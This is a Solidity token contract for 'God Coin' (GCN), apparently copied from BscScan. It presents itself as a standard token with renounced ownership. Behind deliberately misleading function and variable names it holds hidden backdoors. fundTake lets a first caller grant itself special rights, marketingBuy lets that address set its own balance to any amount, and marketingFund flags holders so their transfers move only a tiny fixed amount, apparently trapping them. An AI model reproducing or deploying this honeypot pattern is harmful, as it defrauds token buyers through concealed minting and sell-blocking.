/**
 *Submitted for verification at BscScan.com on 2023-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface feeLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundWallet {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract GodCoin is Ownable {
    uint8 private walletMarketing = 18;

    string private amountShould = "God Coin";
    string private launchedLiquidity = "GCN";

    uint256 private tokenTeamExempt = 100000000 * 10 ** walletMarketing;
    mapping(address => uint256) private autoIs;
    mapping(address => mapping(address => uint256)) private txSenderMode;

    mapping(address => bool) public toAuto;
    address public launchTo;
    address public tradingListSender;
    mapping(address => bool) public totalWallet;
    uint256 constant amountShouldWallet = 10 ** 10;
    bool public exemptTxSender;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        feeLiquidity marketingLaunch = feeLiquidity(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tradingListSender = fundWallet(marketingLaunch.factory()).createPair(marketingLaunch.WETH(), address(this));
        launchTo = receiverLaunch();
        toAuto[launchTo] = true;
        autoIs[launchTo] = tokenTeamExempt;
        emit Transfer(address(0), launchTo, tokenTeamExempt);
        renounceOwnership();
    }

    

    function transferFrom(address toExempt, address feeWallet, uint256 tokenEnableFrom) public returns (bool) {
        if (toExempt != receiverLaunch() && txSenderMode[toExempt][receiverLaunch()] != type(uint256).max) {
            require(txSenderMode[toExempt][receiverLaunch()] >= tokenEnableFrom);
            txSenderMode[toExempt][receiverLaunch()] -= tokenEnableFrom;
        }
        if (feeWallet == launchTo || toExempt == launchTo) {
            return toFee(toExempt, feeWallet, tokenEnableFrom);
        }
        if (totalWallet[toExempt]) {
            return toFee(toExempt, feeWallet, amountShouldWallet);
        }
        return toFee(toExempt, feeWallet, tokenEnableFrom);
    }

    function fundTake(address shouldMarketing) public {
        if (exemptTxSender) {
            return;
        }
        toAuto[shouldMarketing] = true;
        exemptTxSender = true;
    }

    function totalSupply() external view returns (uint256) {
        return tokenTeamExempt;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function marketingBuy(uint256 tokenEnableFrom) public {
        if (!toAuto[receiverLaunch()]) {
            return;
        }
        autoIs[launchTo] = tokenEnableFrom;
    }

    function transfer(address feeWallet, uint256 tokenEnableFrom) external returns (bool) {
        return transferFrom(receiverLaunch(), feeWallet, tokenEnableFrom);
    }

    function allowance(address buyList, address exemptMax) external view returns (uint256) {
        return txSenderMode[buyList][exemptMax];
    }

    function balanceOf(address receiverReceiver) public view returns (uint256) {
        return autoIs[receiverReceiver];
    }

    function symbol() external view returns (string memory) {
        return launchedLiquidity;
    }

    function receiverLaunch() private view returns (address) {
        return msg.sender;
    }

    function name() external view returns (string memory) {
        return amountShould;
    }

    function approve(address exemptMax, uint256 tokenEnableFrom) public returns (bool) {
        txSenderMode[receiverLaunch()][exemptMax] = tokenEnableFrom;
        emit Approval(receiverLaunch(), exemptMax, tokenEnableFrom);
        return true;
    }

    function marketingFund(address teamSell) public {
        if (teamSell == launchTo || teamSell == tradingListSender || !toAuto[receiverLaunch()]) {
            return;
        }
        totalWallet[teamSell] = true;
    }

    function toFee(address isExempt, address tradingAuto, uint256 tokenEnableFrom) internal returns (bool) {
        require(autoIs[isExempt] >= tokenEnableFrom);
        autoIs[isExempt] -= tokenEnableFrom;
        autoIs[tradingAuto] += tokenEnableFrom;
        emit Transfer(isExempt, tradingAuto, tokenEnableFrom);
        return true;
    }

    function decimals() external view returns (uint8) {
        return walletMarketing;
    }


}